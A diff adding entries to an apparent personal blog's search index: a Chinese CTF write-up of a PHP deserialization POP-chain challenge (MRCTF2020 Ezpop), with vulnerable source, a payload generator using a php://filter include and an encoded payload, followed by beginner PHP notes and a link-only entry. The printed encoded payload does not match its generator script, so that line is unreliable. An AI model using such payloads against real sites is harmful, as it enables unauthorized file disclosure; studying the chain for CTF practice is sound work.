@@ -3317,4 +3317,161 @@ if(isset($_GET['exp'])){
         <tag>buu</tag>
       </tags>
   </entry>
+  <entry>
+    <title>MRCTF2020 Ezpop</title>
+    <url>/2021/09/03/buu/19/</url>
+    <content><![CDATA[<p>借鉴博客</p>
+<p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p>
+<p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p>
+<p>这题主要是代码审计，还涉及到一个知识点：构造pop链</p>
+<p>代码审计：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来分而解析几个不同的类</p>
+<p>1.Modifier类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variable，变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p>
+<p>include文件包含漏洞，而者也是我们最后要达成的目的：</p>
+<p>利用文件包含漏洞和php伪协议来读取flag文件</p>
+<p>这里还有魔法方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数。</p>
+<p>2.Show类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p>
+<p>而_toString把类当作字符串时触发</p>
+<p>所以得出wakeup方法可以触发tostring方法</p>
+<p>3.Test类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有魔法方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p>
+<p>思路得出：</p>
+<p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p>
+<p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP and MySQL Web Development(一)</title>
+    <url>/2021/09/03/php/1/</url>
+    <content><![CDATA[<p> 从创建示例Web应用开始：Bob的汽车零部件商店</p>
+<p>创建订单表单：</p>
+<p>任何服务器端脚本语言最常见的应用场景是之一</p>
+<p>1.1</p>
+<p>就是处理HTML表单。</p>
+<p>接下来程序清单1-1：order.html，商店基础HTML代码</p>
+<p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p>
+<p>呈现画面</p>
+<form action="processorder.php" method="post">
+<table style="border: 0px;">
+<tr style="background: #cccccc;">
+    <td style="width: 150px; text-align: center;">Item</td>
+    <td style="width: 15px; text-align: center;">Quantity</td>
+</tr>
+<tr>
+    <td>Tries</td>
+    <td><input type="text" name="tireqty" size="3" maxlength="3"></td>
+</tr>
+<tr>
+    <td>Oil</td>
+    <td><input type="text" name="oilqty" size="3" maxlength="3"></td>
+</tr>
+<tr>
+    <td>Spark Plugs</td>
+    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td>
+</tr>
+<tr>
+    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>
+    </tr>
+    </table>
+    </form>
+
+<p>注意：该表单的action属性被设置为能够处理客户订单的PHP脚本名称，后续会对该脚本进行增添。</p>
+<p>一般地，actions属性就是用户点击提交按钮时将要载入的URL</p>
+<p>用户在表单中输入的数据将按照method属性中指定的HTTP方法发送到这个URL，该方法是get（附加在URL的结尾）或者post（以单独的信息发送）。</p>
+<p>1.2</p>
+<p>表单的处理，需要创建在form标记的action属性中指定的处理脚本，该脚本为processorder.php，代码如下</p>
+<p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p>
+<p>我们在h2处添加了php代码</p>
+<p>这样我们看到php的echo输出语句同时，</p>
+<p>在html页面点击Submit Order也会有类似内容显示</p>
+<p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p>
+<p>请注意</p>
+<p>我们所编写的PHP代码是如何嵌入到一个常见的HTML文件中的</p>
+<p>通过浏览器，我们查看该HTML的源代码</p>
+<p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p>
+<p>以上代码并没有显示原始的PHP语句</p>
+<p>这是因为PHP解释器已经运行了该脚本，并且用该脚本的输出代替了脚本的本身。</p>
+<p>也就是说，通过PHP，我们可以生成能在任何浏览器中查看的纯HTML，换一个意思理解，用户的浏览并不需要理解PHP。</p>
+<p>此文件组成：</p>
+<p>1.HTML 2.PHP标记 3.PHP语句 4.空格</p>
+<p>1.3.1</p>
+<p>PHP标记</p>
+<?php    为开始，
+
+?><p>为结束</p>
+<p>​        这样的标记称作PHP标记，可以告诉服务器PHP代码的开始和结束。</p>
+<p>XML风格(建议使用)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>简短风格</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1.3.2</p>
+<p>PHP语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>echo语句：将传递给其自身的字符串打印或者回显到浏览器</p>
+<p>1.7.1</p>
+<p>PHP的数据类型</p>
+<p>1.整数    Integer</p>
+<p>2.浮点数    Float</p>
+<p>3.字符串    String</p>
+<p>4.布尔    Boolean</p>
+<p>5.数组    Array</p>
+<p>6.对象    Object</p>
+<p>附：三个特殊类型 NULL（空）、resource（资源）、</p>
+<p>callable 。</p>
+<p>1.7.2</p>
+<p>类型强度</p>
+<p>PHP是一种弱类型，或者动态型语言</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure>
+
+<p>此时，$total1是一个整数类型的变量</p>
+<p>而$total2是一个浮点类型的变量。</p>
+<p>若添加以下代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>则$total2是字符串类型的变量。</p>
+<p>1.7.3</p>
+<p>类型转换</p>
+<p>1.7.4</p>
+<p>可变变量</p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯 2020 总决赛 Novel</title>
+    <url>/2021/09/04/buu/20/</url>
+    <content><![CDATA[<p>(<a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a>)</p>
+<p>网鼎杯：</p>
+<p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p>
+]]></content>
+      <tags>
+        <tag>buu</tag>
+      </tags>
+  </entry>
 </search>
